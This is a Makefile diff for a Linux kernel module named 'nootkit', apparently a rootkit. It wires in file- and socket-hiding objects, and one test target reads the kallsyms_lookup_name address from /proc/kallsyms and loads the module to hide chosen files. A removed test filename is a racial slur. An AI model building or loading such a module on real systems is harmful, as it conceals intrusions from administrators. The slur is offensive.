@@ -3,6 +3,7 @@ obj-m := nootkit.o
 nootkit-y := src/nootkit_main.o src/ksyms.o src/config.o
 nootkit-y += src/hide/readdir.o src/hide/proc_net.o
 nootkit-y += src/arch/x86_64/hook.o src/arch/x86_64/mm.o
+nootkit-y += src/arch/x86_64/hide/readdir_sys.o
 
 ccflags-y := -I$(src)/src
 
@@ -38,7 +39,7 @@ test-hide-filename: build test-remove test-upload
 	insmod /nootkit.ko \
 	' \
 	kallsyms_lookup_name=0x$$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
-	hide_filenames=hello,/root/nigga,/proc/5403,/root/bigger \
+	hide_filenames=hello,/root/yellow,/proc/5403,/root/hallo \
 	'
 
 # test: test-hide-filename test-hide-socket
